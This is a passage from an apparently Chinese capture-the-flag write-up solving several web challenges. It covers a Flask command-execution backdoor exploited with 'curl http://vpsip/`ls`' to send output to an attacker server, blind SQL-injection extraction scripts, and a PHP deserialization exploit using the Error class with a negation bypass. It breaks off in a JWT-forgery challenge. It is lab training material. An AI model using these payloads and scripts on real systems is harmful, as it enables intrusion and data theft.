            res <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
            value <span class="token operator">=</span> res<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
            response <span class="token operator">=</span> Response<span class="token punctuation">(</span>value<span class="token punctuation">,</span> mimetype<span class="token operator">=</span><span class="token string">'application/octet-stream'</span><span class="token punctuation">)</span>
            response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=beautiful.jpg'</span>
            <span class="token keyword">return</span> response
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            value <span class="token operator">=</span> <span class="token string">"HACK ERROR!"</span>
    <span class="token keyword">except</span><span class="token punctuation">:</span>
        value <span class="token operator">=</span> <span class="token string">"SOMETHING WRONG!"</span>
    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'search.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>value<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/no_one_know_the_manager'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">manager</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    key <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"key"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>SECRET_KEY<span class="token punctuation">)</span>
    <span class="token keyword">if</span> key <span class="token operator">==</span> SECRET_KEY<span class="token punctuation">:</span>
        shell <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"shell"</span><span class="token punctuation">)</span>
        os<span class="token punctuation">.</span>system<span class="token punctuation">(</span>shell<span class="token punctuation">)</span>
        res <span class="token operator">=</span> <span class="token string">"ok"</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        res <span class="token operator">=</span> <span class="token string">"Wrong Key!"</span>

    <span class="token keyword">return</span> res


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8080</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>注意到下面这一段代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">SECRET_FILE <span class="token operator">=</span> <span class="token string">"/tmp/secret.txt"</span>
f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span>
SECRET_KEY <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>SECRET_FILE<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里将secret.txt文件删除了，因此我们无法再读取该文件，但是需要注意，在linux中使用open方法打开该文件之后读取完就直接移除该文件，并没有将改文件进行关闭，在&#x2F;proc这个进程的pid目录下的fd文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。&#x2F;proc&#x2F;[pid]&#x2F;fd 这个目录里包含了进程打开文件的情况，目录里面有一堆&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;id文件，id就是进程记录的打开文件的文件描述符的序号。<br>通过爆破我们先找到文件在&#x2F;proc&#x2F;self&#x2F;fd&#x2F;3里面<br><img src="https://img-blog.csdnimg.cn/direct/c54238447f1841bb9263c1b70d31cf3e.png" alt="123"><br>看一下源代码这个时候我们在<strong>no_one_know_the_manager</strong>文件下进行反弹shell，先在服务器上监听端口</p>
<blockquote>
<p>nc -lnvp 80<br>之后访问题目网址</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;1d9a43f3-c6de-426e-adab-ee27ceb15d1a.node4.buuoj.cn:81&#x2F;no_one_know_the_manager?key&#x3D;ZPMFELffXNlle7DEFSdvsAj55RCsLLQrErtOFZO&#x2F;lOI&#x3D;&amp;shell&#x3D;curl http:&#x2F;&#x2F;vpsip&#x2F;&#96;ls&#96;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/direct/7ec3a00bbb4e4332aefa42451ae0b084.png" alt="456"></p>
<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>考点：SQL注入<br>当我们分别输入1，2时分别显示Nu1L，V&amp;N<br>当尝试使用注释符的时候发现注释符被过滤了<code>#、--</code><br>结合fuzz，在尝试之后发现下面这三个可以使用</p>
<ul>
<li><p><code>if(1,1,2)</code></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">IF</span> <span class="token punctuation">(</span>condition<span class="token punctuation">,</span> true_value<span class="token punctuation">,</span> false_value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<blockquote>
<p>condition 是 1，这是一个始终为真的条件。<br>true_value 是 1，如果条件为真，将返回的值。<br>false_value 是 2，如果条件为假，将返回的值。</p>
</blockquote>
</li>
<li><p><code>0^1</code></p>
<blockquote>
<p>0 ^ 1 的结果是 1。<br>0 ^ 0 的结果是 0。</p>
</blockquote>
</li>
<li><p><code>(1&amp;&amp;1)</code></p>
</li>
</ul>
<p><strong>尝试爆数据库</strong></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
 
<span class="token number">0</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">32</span><span class="token punctuation">)</span>
 
<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<ul>
<li>database(): 这是一个SQL函数，用于返回当前数据库的名称。它返回字符串形式的数据库名。</li>
<li>substr(database(), 1, 1): 这使用substr函数从当前数据库的名称中提取第一个字符。substr函数的参数是 (string, start, length)，所以这里从数据库名的第一个字符开始，取一个字符的长度。</li>
<li>ascii(substr(database(), 1, 1)): ascii函数用于获取字符的ASCII码值。在这里，它获取了数据库名的第一个字符的ASCII码值。</li>
<li>if(ascii(substr(database(), 1, 1)) &gt; 32, 1, 2): 这是一个条件语句。如果数据库名的第一个字符的ASCII码值大于32，条件为真，返回1；否则，条件为假，返回2。</li>
</ul>
</blockquote>
<p><code>INFORMATION_SCHEMA</code>被过滤了，使用<code>sys.x$schema_table_statistics_with_buffer</code>代替。<br>参考<a href="https://blog.csdn.net/qq_45521281/article/details/106647880">Bypass information_schema与无列名注入_WHOAMIAnony的博客-CSDN博客</a></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">if</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> sys<span class="token punctuation">.</span>x$schema_table_statistics_with_buffer <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>

<span class="token number">0</span><span class="token operator">^</span><span class="token punctuation">(</span>ascii<span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> sys<span class="token punctuation">.</span>x$schema_table_statistics_with_buffer <span class="token keyword">where</span> table_schema <span class="token operator">=</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">32</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>发现都能够正常回显使用异或或者二分法的python脚本来进行爆表</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
url<span class="token operator">=</span><span class="token string">'http://750e4b79-c6f5-42e5-8fc7-dd35e77fa400.node4.buuoj.cn:81/'</span>
flag<span class="token operator">=</span><span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    high<span class="token operator">=</span><span class="token number">127</span>
    low<span class="token operator">=</span><span class="token number">32</span>
    mid<span class="token operator">=</span><span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> high<span class="token operator">></span>low<span class="token punctuation">:</span>

        <span class="token comment">#payload = '1 &amp;&amp; (ascii(substr((select database()),&#123;0&#125;,1))>&#123;1&#125;)'.format(i, mid) #爆库</span>
        <span class="token comment">#payload = '1 &amp;&amp; (ascii(substr((select version()),&#123;0&#125;,1))>&#123;1&#125;)'.format(i, mid)# 爆版本</span>
        payload <span class="token operator">=</span> <span class="token string">'1 &amp;&amp; (ascii(substr((select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()),&#123;0&#125;,1))>&#123;1&#125;)'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span> <span class="token comment">#爆表</span>

        data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
            <span class="token string">'id'</span><span class="token punctuation">:</span>payload
        <span class="token punctuation">&#125;</span>
        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
        response<span class="token punctuation">.</span>encoding<span class="token operator">=</span><span class="token string">"Windows-1252"</span>

        <span class="token keyword">if</span> <span class="token string">'Nu1L'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            low<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            high<span class="token operator">=</span>mid
        mid<span class="token operator">=</span><span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>
    flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>爆出MYSQL5.5.8<br>表f1ag_1s_h3r3_hhhhh</p>
<p><strong>无列名注入</strong><br>要利用到ascii偏移注入，也就是比较盲注，具体可参考<a href="https://blog.csdn.net/qq_45521281/article/details/106647880">Bypass information_schema与无列名注入_WHOAMIAnony的博客-CSDN博客</a></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">
<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time
 
 
url <span class="token operator">=</span> <span class="token string">"http://750e4b79-c6f5-42e5-8fc7-dd35e77fa400.node4.buuoj.cn:81/"</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
i <span class="token operator">=</span> <span class="token number">0</span>
 
 
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    i <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span>
    letf <span class="token operator">=</span> <span class="token number">32</span>
    right <span class="token operator">=</span> <span class="token number">127</span>
    <span class="token keyword">while</span> letf <span class="token operator">&lt;</span> right<span class="token punctuation">:</span>
        s <span class="token operator">=</span> flag
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>letf<span class="token operator">+</span>right<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
        s <span class="token operator">=</span> s <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
        payload <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0^((select * from f1ag_1s_h3r3_hhhhh)>(select 1,'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>s<span class="token punctuation">&#125;</span></span><span class="token string">'))"</span></span>
        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span>
        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token string">"Nu1L"</span> <span class="token keyword">in</span> res<span class="token punctuation">:</span>
            letf <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            right <span class="token operator">=</span> mid
    <span class="token keyword">if</span> letf <span class="token operator">!=</span> <span class="token number">32</span><span class="token punctuation">:</span>
        flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>letf<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.2</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/direct/d29d300f4ae145fba8a3cc081b6ba2fe.png" alt="456"></p>
<h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
               <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
               <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
           <span class="token punctuation">&#125;</span>
           
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'great'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个用来考察php原生类，在题目中用到了Error类。<br>Error类中用到了<code>__toString</code>方法，MD5()和sha1()函数都会调用<code>__toString()</code>方法。<br>然后开始构造，使用文件包含，由于正则表达式的存在，我们进行取反绕过</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
//%D0%99%93%9E%98<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">SYCLOVER</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token variable">$syc</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token variable">$lover</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span> <span class="token operator">!=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">lover</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&lt;\?php|\(|\)|\"|\'/"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
                <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">syc</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Try Hard !!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>

        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">SYCLOVER</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string double-quoted-string">"?>&lt;?=include ~"</span><span class="token operator">.</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"%D0%99%93%9E%98"</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">";?>"</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">-></span><span class="token property">syc</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-></span><span class="token property">lover</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p>打开题目之后测试各个功能，发现存在jwt，解码之后jwt中带有jkl<br><img src="https://img-blog.csdnimg.cn/direct/c5c8d86ee1314c268f2b53a1771738b3.png" alt="13"></p>
<p>那么在这里就想到了jwt伪造，最重要的一点就是要知道secret_key，该怎么寻找secret_key呢？<br>访问robots.txt文件发现源码路径<code>/filebak</code>。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/cookies'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'sinatra/json'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'jwt'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'securerandom'</span></span>
<span class="token keyword">require</span> <span class="token string-literal"><span class="token string">'erb'</span></span>

set <span class="token symbol">:public_folder</span><span class="token punctuation">,</span> <span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-literal"><span class="token string">'/static'</span></span>

<span class="token constant">FLAGPRICE</span> <span class="token operator">=</span> <span class="token number">1000000000000000000000000000</span>
<span class="token constant">ENV</span><span class="token punctuation">[</span><span class="token string-literal"><span class="token string">"SECRET"</span></span><span class="token punctuation">]</span> <span class="token operator">=</span> SecureRandom<span class="token punctuation">.</span>hex<span class="token punctuation">(</span><span class="token number">64</span><span class="token punctuation">)</span>

configure <span class="token keyword">do</span>
  enable <span class="token symbol">:logging</span>
  file <span class="token operator">=</span> <span class="token class-name">File</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token builtin">File</span><span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__FILE__<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string-literal"><span class="token string">'/../log/http.log'</span></span><span class="token punctuation">,</span><span class="token string-literal"><span class="token string">"a+"</span></span><span class="token punctuation">)</span>
  file<span class="token punctuation">.</span>sync <span class="token operator">=</span> <span class="token boolean">true</span>
  use Rack<span class="token double-colon punctuation">::</span>CommonLogger<span class="token punctuation">,</span> file
<span class="token keyword">end</span>

get <span class="token string-literal"><span class="token string">"/"</span></span> <span class="token keyword">do</span>
  redirect <span class="token string-literal"><span class="token string">'/shop'</span></span><span class="token punctuation">,</span> <span class="token number">302</span>
<span class="token keyword">end</span>

get <span class="token string-literal"><span class="token string">"/filebak"</span></span> <span class="token keyword">do</span>
  content_type <span class="token symbol">:text</span>
  erb <span class="token builtin">IO</span><span class="token punctuation">.</span>binread __FILE__
<span class="token keyword">end</span>

get <span class="token string-literal"><span class="token string">"/api/auth"</span></span> <span class="token keyword">do</span>
  payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token symbol">uid</span><span class="token operator">:</span> SecureRandom<span class="token punctuation">.</span>uuid <span class="token punctuation">,</span> <span class="token symbol">jkl</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span>
